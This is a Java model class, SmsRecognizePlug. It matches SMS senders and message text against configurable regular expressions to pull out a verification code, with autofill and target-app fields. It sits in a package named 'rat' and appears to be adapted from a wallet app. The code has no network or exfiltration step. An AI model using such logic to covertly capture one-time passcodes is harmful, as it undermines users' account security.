package com.vendor.rat.model.resp;

// ADAPT: vendor = com.guard.wallet.resp.SmsRecognizePlug
import androidx.annotation.NonNull;
import com.vendor.rat.auto.condition.CombineFilter;
import java.io.Serializable;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsRecognizePlug implements Serializable {
    private static final String SMS_RECOGNIZE_TOPIC = "android.intent.action.SMS_RECOGNIZE";
    private static final String TAG = "SmsRecognizePlug";
    private Integer autoFill;
    private CombineFilter combineFilter;
    private String contentRegExp;
    private String id;
    private String senderRegExp;
    private String suitClassName;
    private String suitPackageName;

    public SmsRecognizePlug() {
    }

    public SmsRecognizePlug(String id, String suitPackageName, String suitClassName, String senderRegExp, String contentRegExp, CombineFilter combineFilter, Integer autoFill) {
        this.id = id;
        this.suitPackageName = suitPackageName;
        this.suitClassName = suitClassName;
        this.senderRegExp = senderRegExp;
        this.contentRegExp = contentRegExp;
        this.combineFilter = combineFilter;
        this.autoFill = autoFill;
    }

    public boolean matchSender(String sender) {
        if (sender == null || sender.isEmpty()) {
            return false;
        }
        if (this.senderRegExp == null || this.senderRegExp.isEmpty()) {
            return true;
        }
        try {
            return Pattern.compile(this.senderRegExp).matcher(sender).matches();
        } catch (Exception e) {
            return false;
        }
    }

    public String matchRecognizeContent(String content) {
        if (content == null || content.isEmpty()) {
            return null;
        }
        if (this.contentRegExp == null || this.contentRegExp.isEmpty()) {
            return content;
        }
        try {
            Matcher matcher = Pattern.compile(this.contentRegExp).matcher(content);
            while (matcher.find()) {
                String group = matcher.group("SmsCode");
                if (group != null && !group.isEmpty()) {
                    return group;
                }
            }
        } catch (Exception e) {
            // TODO: VENDOR_VERIFY - vendor logs via q.s(TAG, e)
        }
        return null;
    }

    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj == null || getClass() != obj.getClass()) {
            return false;
        }
        return Objects.equals(this.id, ((SmsRecognizePlug) obj).id);
    }

    public Integer getAutoFill() {
        return this.autoFill;
    }

    public CombineFilter getCombineFilter() {
        return this.combineFilter;
    }

    public String getContentRegExp() {
        return this.contentRegExp;
    }

    public String getId() {
        return this.id;
    }

    public String getSenderRegExp() {
        return this.senderRegExp;
    }

    public String getSuitClassName() {
        return this.suitClassName;
    }

    public String getSuitPackageName() {
        return this.suitPackageName;
    }

    public int hashCode() {
        return Objects.hash(this.id);
    }

    public void setAutoFill(Integer autoFill) {
        this.autoFill = autoFill;
    }

    public void setCombineFilter(CombineFilter combineFilter) {
        this.combineFilter = combineFilter;
    }

    public void setContentRegExp(String contentRegExp) {
        this.contentRegExp = contentRegExp;
    }

    public void setId(String id) {
        this.id = id;
    }

    public void setSenderRegExp(String senderRegExp) {
        this.senderRegExp = senderRegExp;
    }

    public void setSuitClassName(String suitClassName) {
        this.suitClassName = suitClassName;
    }

    public void setSuitPackageName(String suitPackageName) {
        this.suitPackageName = suitPackageName;
    }

    @NonNull
    public String toString() {
        return "SmsRecognizePlug{id=" + this.id
                + ", suitPackageName='" + this.suitPackageName
                + "', suitClassName='" + this.suitClassName
                + "', senderRegExp='" + this.senderRegExp
                + "', contentRegExp='" + this.contentRegExp
                + "', combineFilter=" + this.combineFilter + '}';
    }
}
